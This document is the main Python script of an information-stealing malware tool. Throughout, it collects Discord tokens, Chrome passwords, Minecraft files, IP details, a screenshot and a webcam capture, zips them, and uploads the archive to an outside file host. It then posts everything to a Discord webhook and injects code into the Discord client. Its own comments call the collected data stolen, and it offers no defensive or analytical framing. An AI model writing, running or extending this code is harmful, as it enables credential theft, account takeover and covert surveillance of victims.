# import plugins
from plugins.discord.tokens import *
from plugins.discord.webhook import *
from plugins.images import *
from plugins.ip import ips
from plugins.minecraft import *
from plugins.injector import *
from plugins.password import *
from plugins.temp import *
from plugins.upload import *
from plugins.zip import *

# Define Variables
webhook = ''

tempdir = mkdtemp() + '\\'

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
try:
    webcam = getwebcam(tempdir)
    screenshot = getscreenshot(tempdir)
except:
    pass
try:
    minecraftfiles = findminecraft()
except:
    pass
try:
    chromepasswords = getchromepasswords(tempdir)
except:
    pass

TokenList, PlatformList = Grabber(tempdir)
ipdetail, ipv6, ipv4 = ips()

# Make the Zipfile
Zip = mkdzip(tempdir)
# Write all files
##TOKENS
try:
    ziptokens(Zip, TokenList, PlatformList, tempdir)
except:
    pass
##MINECRAFT
try:
    zipminecraft(Zip, minecraftfiles)
except:
    pass
##CHROME PASSWORDS
try:
    zipchromepw(Zip, tempdir)
except:
    pass
# Close the Zipfile
closezip(Zip)
# Upload to CDN
try:
    file = uploadtoflawcra(os.path.join(tempdir, 'info.zip'))
except:
    pass
# Create the Webhook
Webhook = makewebhook(webhook)

# Add every Stolen Thing
try:
    addtokens(Webhook, TokenList, PlatformList)
except:
    pass
try:
    addipinfo(Webhook, ipv4, ipv6, ipdetail)
except:
    pass
try:
    addimages(Webhook, screenshot, webcam)
except:
    pass
try:
    addcdn(Webhook, file)
except:
    pass

# Execute Webhook
Webhook.execute()

# Inject into Discord
inject()
